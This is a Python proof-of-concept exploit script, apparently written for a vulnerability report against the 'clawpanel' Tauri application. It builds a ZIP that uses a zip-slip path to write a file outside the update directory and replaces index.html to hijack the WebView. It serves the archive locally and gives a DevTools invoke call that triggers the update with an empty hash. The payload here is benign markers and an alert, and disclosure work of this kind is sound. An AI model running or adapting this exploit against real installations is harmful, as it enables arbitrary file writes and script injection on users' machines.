# poc_clawpanel_update_chain.py
# Usage:
#   python poc_clawpanel_update_chain.py
#   Then run this in clawpanel WebView DevTools:
#     window.__TAURI__.core.invoke('download_frontend_update', {
#       url: 'http://127.0.0.1:8931/payload.zip',
#       expectedHash: '',
#       version: '99.9.9'
#     })
import http.server, socketserver, threading, zipfile, io, os, pathlib

# 1) Build a malicious ZIP
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        # (a) ZIP slip: write a marker file into the OpenClaw config directory
        #    The web-update directory is at ~/.openclaw/clawpanel/web-update/
        #    Going up 1 levels lands in ~/.openclaw/clawpanel/, then 1 more to ~/.openclaw/
    z.writestr("../zipslip_marker.txt", b"PWNED via zip-slip\n")
        # (b) Replace index.html to hijack the next WebView load
    z.writestr("index.html", """<!doctype html><meta charset=utf-8>
<title>PWNED</title>
<h1>clawpanel hot-update hijack OK</h1>
<script>
    // In a real exploit, replace this with invoke calls to any registered command
  alert("PWNED ATTACK");
</script>""".encode("utf-8"))
payload = buf.getvalue()
pathlib.Path("payload.zip").write_bytes(payload)

# 2) Expose the ZIP with a simple HTTP server
class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a, **k): pass
print("Serving payload.zip on http://127.0.0.1:8931/payload.zip")
with socketserver.TCPServer(("127.0.0.1", 8931), H) as s:
    s.serve_forever()
